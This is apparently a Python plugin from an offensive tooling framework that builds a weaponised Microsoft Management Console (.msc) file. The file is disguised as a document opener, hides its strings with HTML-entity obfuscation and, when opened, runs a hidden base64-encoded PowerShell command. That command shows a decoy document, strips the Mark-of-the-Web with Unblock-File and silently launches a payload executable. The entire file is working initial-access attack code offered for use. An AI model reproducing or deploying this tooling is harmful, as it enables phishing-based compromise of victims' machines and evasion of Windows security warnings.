"""
Erebus Plugin - MSC Fake Explorer Trigger
Author: Whispergate
Description: Generates an MSC file using the custom ConsoleTaskpad structure AND MotW Bypass.
"""

import pathlib
import uuid
import base64
from typing import Optional, Dict, Callable

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory

class MscExplorerTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating 'Fake Explorer' MSC triggers using the user-provided strict template.
    """
    
    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="msc_explorer_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates MSC triggers using custom ConsoleTaskpad structure + MotW Bypass",
            category=PluginCategory.TRIGGER,
            enabled=True
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_msc_explorer_trigger": self.create_msc_explorer_trigger,
        }
    
    def validate(self):
        return (True, None)

    def _obfuscate(self, text: str) -> str:
        """Encodes text to HTML entities (&#xHEX;) for XML obfuscation"""
        return "".join(f"&#x{ord(c):x};" for c in text)

    def create_msc_explorer_trigger(
        self,
        payload_exe: str,
        decoy_file: str,
        payload_dir: Optional[pathlib.Path] = None,
        output_filename: str = "documents.msc"
    ) -> pathlib.Path:
        
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        
        output_path = payload_dir / output_filename
        
        payload_exe_name = pathlib.Path(payload_exe).name
        decoy_file_name = pathlib.Path(decoy_file).name
        cmd_path_raw = r"%WINDIR%\\System32\\cmd.exe"
        cmd_path_enc = self._obfuscate(cmd_path_raw)

        ps_logic = (
            f"$a=gwmi win32_process -Filter \"ProcessId=$PID\";"
            f"$b=gwmi win32_process -Filter \"ProcessId=$($a.ParentProcessId)\";"
            f"$c=gwmi win32_process -Filter \"ProcessId=$($b.ParentProcessId)\";"
            f"if($c.CommandLine -match '(?:\\\"|^)([^\\\"]+\\.msc)(?:\\\"|$)') {{"
            f"  $p=$matches[1];"
            f"  $d=Split-Path $p;"
            f"  Start-Process -FilePath \"$d\\{decoy_file_name}\";"
            f"  Start-Sleep -m 500;"
            f"  Unblock-File -Path \"$d\\{payload_exe_name}\" -ErrorAction SilentlyContinue;"
            f"  Start-Process -FilePath \"$d\\{payload_exe_name}\" -WindowStyle Hidden;"
            f"}}"
        )
        
        ps_bytes = ps_logic.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_bytes).decode('ascii')
        
        cmd_args_raw = f'/c powershell -nop -w hidden -enc {ps_b64}'
        cmd_args_enc = self._obfuscate(cmd_args_raw)
  
  
        dir_enc = self._obfuscate(r"%USERPROFILE%")
        
        str_favorites = "Favorites" 
        str_explorer = self._obfuscate("Explorer")
        str_open = self._obfuscate("Open")
        str_open_desc = self._obfuscate("Open requested document")
        str_decoy_name = self._obfuscate(decoy_file_name)
        str_task_desc = self._obfuscate("Requested Document")
        
        guid_console = str(uuid.uuid4()).upper()
        guid_node_type = "{C96401CE-0E17-11D3-885B-00C04F72C717}" 
        guid_snapin = "{C96401CC-0E17-11D3-885B-00C04F72C717}"
        guid_taskpad = str(uuid.uuid4()).upper()
        
        msc_content = f"""<?xml version="1.0"?><MMC_ConsoleFile ConsoleVersion="3.0" ProgramMode="UserSDI">


  <ConsoleFileID>{{{guid_console}}}</ConsoleFileID>
    <FrameState ShowStatusBar="false" PreventViewCustomization="true">
    <WindowPlacement ShowCommand="SW_SHOWNORMAL">
      <Point Name="MinPosition" X="-1" Y="-1"/>
      <Point Name="MaxPosition" X="-1" Y="-1"/>
      <Rectangle Name="NormalPosition" Top="300" Bottom="700" Left="300" Right="1000"/>
    </WindowPlacement>
  </FrameState>
  <Views>
    <View ID="1" ScopePaneWidth="392" ActionsPaneWidth="-1">
      <BookMark Name="RootNode" NodeID="1"/>
      <BookMark Name="SelectedNode" NodeID="1"/>
      <WindowPlacement WPF_RESTORETOMAXIMIZED="true" ShowCommand="SW_SHOWMAXIMIZED">
        <Point Name="MinPosition" X="-1" Y="-1"/>
        <Point Name="MaxPosition" X="-8" Y="-31"/>
        <Rectangle Name="NormalPosition" Top="0" Bottom="700" Left="0" Right="1000"/>
      </WindowPlacement>
      <ViewOptions ViewMode="Report" ScopePaneVisible="false" ActionsPaneVisible="false" DescriptionBarVisible="true" NoStatusBar="true" NoStdButtons="true" DefaultColumn0Width="200" DefaultColumn1Width="0"/>
    </View>
  </Views>
  <VisualAttributes>
    <Icon Index="42" File="%windir%\\\\System32\\\\msvcr110.dll">
      <Image Name="Large" BinaryRefIndex="0"/>
      <Image Name="Small" BinaryRefIndex="1"/>
    </Icon>
  </VisualAttributes>
  <Favorites>
    <Favorite TYPE="Group">
      <String Name="Name" ID="1"/>
      <Favorites/>
    </Favorite>
  </Favorites>
  <ScopeTree>
    <SnapinCache>
      <Snapin CLSID="{guid_snapin}" AllExtensionsEnabled="true"/>
    </SnapinCache>
    <Nodes>
      <Node ID="1" ImageIdx="0" CLSID="{guid_snapin}" Preload="true">
        <Nodes/>
        <String Name="Name" ID="2"/>
        <ComponentDatas>
          <ComponentData>
            <GUID Name="Snapin">{guid_snapin}</GUID>
            <Stream BinaryRefIndex="2"/>
          </ComponentData>
        </ComponentDatas>
        <Components/>
      </Node>
    </Nodes>
  </ScopeTree>
  <ConsoleTaskpads>
    <ConsoleTaskpad ListSize="Medium" IsNodeSpecific="false" ReplacesDefaultView="true" NoResults="true" DescriptionsAsText="true" NodeType="{guid_node_type}" ID="{{{guid_taskpad}}}">
      <String Name="Name" ID="3"/>
      <String Name="Description" ID="4"/>
      <String Name="Tooltip" Value="This year report"/>
      <Tasks>
        <Task Type="CommandLine" Command="{cmd_path_enc}">
          <String Name="Name" ID="5"/>
          <String Name="Description" ID="6"/>
          <Symbol>
            <Image Name="Small" BinaryRefIndex="3"/>
            <Image Name="Large" BinaryRefIndex="4"/>
          </Symbol>
          <CommandLine Directory="{dir_enc}" WindowState="Minimized" Params="{cmd_args_enc}"/>
        </Task>
      </Tasks>
      <BookMark Name="TargetNode" NodeID="1"/>
    </ConsoleTaskpad>
  </ConsoleTaskpads>
  <ViewSettingsCache>
    <TargetView ViewID="1" NodeTypeGUID="{guid_node_type}"/>
    <ViewSettings Flag_TaskPadID="true" Age="1">
      <GUID>{{{str(uuid.uuid4()).upper()}}}</GUID>
    </ViewSettings>
  </ViewSettingsCache>
  <ColumnSettingsCache/>
  <StringTables>
    <IdentifierPool AbsoluteMin="1" AbsoluteMax="65535" NextAvailable="7"/>
    <StringTable>
      <GUID>{{71E5B33E-1064-11D2-808F-0000F875A9CE}}</GUID>
      <Strings>
        <String ID="1" Refs="1">{str_favorites}</String>
        <String ID="2" Refs="2">{str_explorer}</String>
        <String ID="3" Refs="1">{str_open}</String>
        <String ID="4" Refs="1">{str_open_desc}</String>
        <String ID="5" Refs="1">{str_decoy_name}</String>
        <String ID="6" Refs="1">{str_task_desc}</String>
      </Strings>
    </StringTable>
  </StringTables>
  <BinaryStorage>
    <Binary Name="CONSOLE_FILE_ICON_LARGE"></Binary>
    <Binary Name="CONSOLE_FILE_ICON_SMALL"></Binary>
    <Binary>
AQAAABQAAAAAAAAAAgAAAP////8=
    </Binary>
  <Binary>

    </Binary>
    <Binary>

    </Binary>
  </BinaryStorage>
</MMC_ConsoleFile>
"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(msc_content)
            
        return output_path
